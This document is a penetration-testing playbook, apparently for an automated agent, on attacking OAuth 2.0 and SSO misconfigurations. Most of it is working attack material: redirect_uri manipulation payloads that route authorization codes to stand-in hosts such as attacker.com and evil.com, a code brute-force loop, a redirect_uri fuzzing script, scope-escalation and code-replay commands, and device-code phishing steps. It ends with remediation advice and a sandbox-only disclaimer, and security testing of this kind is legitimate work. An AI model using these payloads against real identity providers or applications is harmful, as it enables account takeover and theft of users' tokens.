# OAuth 2.0 / SSO Misconfiguration — Skill Playbook

**Mitre ATT&CK ID:** T1550.001 (Use Alternate Authentication Material: Application Access Token), T1078 (Valid Accounts)
**OWASP Mapping:** A07:2021 – Identification and Authentication Failures, A01:2021 – Broken Access Control
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: oauth-sso-v1
category: api-security
author: HiveBreach
mitre_attack_id: T1550.001
owasp_mapping:
  - A07:2021-Identification and Authentication Failures
  - A01:2021-Broken Access Control
tags:
  - oauth
  - oauth2
  - oidc
  - sso
  - account-takeover
  - redirect-uri
  - csrf
  - token-leakage
  - T1550.001
environments:
  - web
  - api
  - oauth
  - microservice
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Identify OAuth Flows

| Flow | Indicators | Risk |
|---|---|---|
| Authorization Code | `?response_type=code&client_id=...` | High if state missing |
| Implicit | `response_type=token` (token in URL fragment) | High (token leak) |
| Client Credentials | `grant_type=client_credentials` | Secret/scope abuse |
| Device Code | `urn:ietf:params:oauth:grant-type:device_code` | Phishing/TOCTOU |
| Code + PKCE | `code_challenge=...&code_challenge_method=S256` | Lower risk |

Detection:
```bash
rg -in "client_id|redirect_uri|response_type=code|response_type=token|oidc|openid" js/ html/
curl -s https://target.com/login | rg -in "oauth|sso|redirect_uri|client_id"
```

Common endpoints:
```
/authorize?response_type=code&client_id=...
/.well-known/openid-configuration
/oauth/authorize, /oauth/token
/connect/authorize (Microsoft)
/realms/{realm}/protocol/openid-connect/auth (Keycloak)
```

### 1.2 Capture Full Authorize Request

```bash
curl -i "https://idp.example.com/authorize?response_type=code&client_id=app&redirect_uri=https://target.com/callback&scope=openid%20profile%20email&state=abc123"
```

Record `client_id`, `redirect_uri`, `scope`, `state`, `nonce`, `response_mode`, session cookie.---

## 2. Confirmation

### 2.1 redirect_uri Manipulation

```bash
redirect_uri=https://attacker.com
redirect_uri=https://target.com/callback.evil.com
redirect_uri=https://target.com/callback@evil.com
redirect_uri=https://evil.com/&redirect_uri=https://target.com/callback
redirect_uri=https://target.com/callback%2F..%2F..%2Fevil.com
redirect_uri=javascript:alert(1)
redirect_uri=https://evil.com#@target.com/callback
redirect_uri=https://target.com.evil.com/callback
redirect_uri=https://sub.target.com/callback (open subdomain)
```

Confirmation: the authorization code/token is delivered to the attacker's `redirect_uri`.

### 2.2 State Parameter / CSRF

- Remove `state` and complete the flow -> if the callback accepts the code, login CSRF is possible
- Login as victim, capture the code, replay to attach victim's account to attacker's session
- Predictable/static `state` enables the same chain

### 2.3 Scope Escalation

```bash
curl -s "https://idp.example.com/authorize?response_type=code&client_id=app&redirect_uri=https://target.com/callback&scope=admin"
curl -s "https://idp.example.com/authorize?response_type=code&client_id=app&scope=openid%20profile%20email%20offline_access%20admin.read"
```
If the server grants more scope than the client is entitled to, then use the token against the API.

---

## 3. Exploitation

### 3.1 Authorization Code Interception via Open Redirect

1. Find an open redirect on the same domain: `https://target.com/redirect?url=https://evil.com`
2. Register a passing `redirect_uri`: `https://target.com/redirect?url=https://evil.com`
3. Victim clicks attacker link -> code flows to `https://evil.com/?code=...`
4. Attacker exchanges the code for a token and logs in as the victim

**OAuth Account Takeover chain (HackTricks):**
1. Login with attacker's OAuth account
2. Identify the code/token exchange request and `redirect_uri` handling
3. Manipulate `redirect_uri` to attacker domain
4. Trick victim into completing the flow -> steal victim's code/token
5. Exchange the stolen token at `/oauth/token` to impersonate the victim

### 3.2 Token Leakage via Referer / Logs

```bash
curl -i "https://idp.example.com/authorize?response_type=token&client_id=app&redirect_uri=https://target.com/callback"
# Token in URL fragment -> page loads external resource -> Referer leaks token
```

Check for: tokens in `Referer` to CDNs/analytics, tokens in server/access/error logs, browser history, provider logs storing callback URLs.

### 3.3 Client Secret in Frontend

```bash
rg -in "client_secret|clientSecret|secret=" --glob '*.js' /tmp/scope-download/
curl -s https://idp.example.com/oauth/token \
  -d "grant_type=client_credentials&client_id=app&client_secret=LEAKED_SECRET&scope=admin"
```

### 3.4 Code Reuse / Weak Code Entropy

```bash
# Replay a stolen code (single-use expected)
curl -s https://idp.example.com/oauth/token \
  -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://target.com/callback&client_id=app"
# Valid for multiple exchanges or lacks client check -> replay

# Weak/sequential code entropy
for c in $(seq -w 1 9999); do
  curl -s https://idp.example.com/oauth/token -d "grant_type=authorization_code&code=code-$c&redirect_uri=..." | rg -q access_token && echo "HIT $c"
done
```

### 3.5 Device Code Flow Attacks

1. Initiate: `grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=app`
2. Server returns `device_code` + `user_code`
3. Victim phished to enter `user_code` at `https://idp.example.com/device`
4. Attacker polls `/oauth/token` with `device_code` -> victim's token
5. Request high-value scopes during consent fishing

### 3.6 PKCE Downgrade + JWT Claim Confusion

- If the client sends PKCE but the server does not enforce it, strip `code_challenge`/`code_verifier` and exchange the code without the verifier
- `iss`/`aud` validation: swap tokens between relying parties
- `sub` is attacker's ID but `email` is victim's -> RP links victim email to attacker account
- Missing `nonce` in OIDC -> replay id_token

---

## 4. Tool-Specific Guidance

### 4.1 Custom script (redirect_uri fuzzing)

```python
import requests
uris = ["https://attacker.com","https://target.com/callback@attacker.com",
        "https://target.com/callback.evil.com","https://attacker.com/callback#@target.com"]
for u in uris:
    r = requests.get("https://idp.example.com/authorize", params={
        "response_type":"code","client_id":"app","redirect_uri":u,"state":"x"},
        allow_redirects=False)
    print(u, "->", r.status_code, r.headers.get("Location"))
```

### 4.2 Burp Suite

- Record authorize -> callback -> token exchange as a session-handling macro
- Macros + Grep to detect missing `state`
- Compare responses across manipulated `redirect_uri` values in Repeater

### 4.3 nuclei / ZAP

```bash
nuclei -u https://target.com -t ~/nuclei-templates/http/exposures/ -jsonl oauth.jsonl
```

ZAP OAuth add-on: import client config, manipulate scopes and redirect URIs.

---

## 5. PoC Generation

### PoC Template

```markdown
## OAuth/SSO Misconfiguration — [FINDING_ID]

**Authorization server:** https://idp.example.com/authorize
**Client:** app (client_id=app)
**Flow:** Authorization Code / Implicit / Device Code
**Vulnerability:** [redirect_uri manipulation / missing state / scope escalation / token leakage]

### Payload
https://idp.example.com/authorize?response_type=code&client_id=app&scope=openid&redirect_uri=https://attacker.com/collect&state=

### Evidence
- Authorization code delivered to attacker URL
- Token appeared in Referer/logs
- Login CSRF succeeded (state absent)

### Impact
- Full account takeover via stolen code/token
- Cross-account session fixation
- Elevated scope access to APIs

### Remediation
- Enforce exact redirect_uri allow-list matching
- Require and validate strong random state/nonce
- Use PKCE for all public clients
- Never send tokens in URL fragments
- Rotate and protect client secrets server-side
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Flows tested against sandbox OIDC provider (Keycloak/Dex/ORY)
- [ ] No real codes or tokens captured
- [ ] redirect_uri allow-list behaviour documented
- [ ] Account takeover chain replayed on throwaway accounts
- [ ] Consent/scope grants limited to lab users

### Prohibited Actions
- Intercepting real user tokens
- Login CSRF against production users
- Replaying stolen codes on live systems

---

## 7. Cheat Sheet / Reference

| Test | Mutation | Success signal |
|---|---|---|
| redirect_uri swap | `redirect_uri=https://attacker.com` | code to attacker |
| suffix bypass | `https://target.com.evil.com` | code to attacker |
| open redirect chain | `https://target.com/r?url=evil.com` | code to attacker |
| missing state | drop `state` | login CSRF works |
| scope escalation | `scope=admin` | token with admin |
| code replay | reuse `code` | second token |
| PKCE downgrade | strip challenge | exchange without verifier |
| secret leak | grep JS for client_secret | client impersonation |
| device code | start flow + poll | victim token |

**Token exchange:**
```bash
curl -s https://idp.example.com/oauth/token \
  -d "grant_type=authorization_code&code=<code>&client_id=app&client_secret=<sec>&redirect_uri=https://target.com/callback" | jq .
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1550.001 | Use Alternate Authentication Material: App Access Token | Token abuse |
| T1528 | Steal Application Access Token | Code/token interception |
| T1078 | Valid Accounts | Post-ATO persistence |
| T1566 | Phishing | Victim lured to device-code/consent |
| T1204 | User Execution | Click-based OAuth abuse |

---

## 9. References

- HackTricks OAuth to Account Takeover: https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
- PayloadsAllTheThings OAuth: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth
- RFC 9700 (OAuth 2.0 Security Best Practices): https://datatracker.ietf.org/doc/html/rfc9700
- PortSwigger OAuth: https://portswigger.net/web-security/oauth
- OWASP OAuth2 Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_security_cheat_sheet.html

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
